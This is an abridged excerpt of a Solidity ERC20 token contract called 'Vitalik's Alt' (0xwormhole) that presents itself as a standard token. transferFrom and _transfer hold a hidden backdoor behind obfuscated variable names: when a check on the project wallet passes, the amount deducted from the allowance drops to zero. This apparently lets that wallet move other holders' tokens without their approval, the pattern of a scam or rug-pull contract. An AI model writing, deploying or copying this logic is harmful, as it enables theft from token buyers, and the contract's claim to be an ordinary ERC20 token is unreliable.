...
/*
    https://firefly.social/profile/x/0xwormhole
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        _marvWisper = amount; _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= _marvWisper,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - _marvWisper);
        }
...
contract wormhole is ERC20, Ownable {
    ...
    address private DREAM_Addr;
    uint120 private freedomDREAM_;
    string private constant marrvvv = "0xwormhold";
    ...
    constructor() ERC20("Vitalik's Alt", "0xwormhole") payable{
    ...
    function _transfer(
        ...
        if(_isSenderCheck(projectWallet))_marvWisper = 0;
